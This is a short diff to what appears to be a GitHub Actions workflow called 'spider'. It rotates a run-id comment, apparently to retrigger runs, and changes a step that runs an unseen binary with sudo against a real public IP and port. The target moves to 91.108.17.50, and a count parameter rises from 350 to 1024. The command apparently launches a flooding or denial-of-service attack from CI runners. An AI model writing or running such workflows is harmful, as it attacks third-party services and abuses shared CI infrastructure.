@@ -1,4 +1,4 @@
-# run 76151f8aa4b84bba94255541592e5ab6
+# run b89342d8170d4146b21f84913c9e63e0
 name: spider
 on:
   push:
@@ -19,4 +19,4 @@ jobs:
     - name: run
       run: |
         chmod +x ./spider
-        sudo ./spider 91.108.17.7 32003 30 350 vc
+        sudo ./spider 91.108.17.50 32003 30 1024 vc
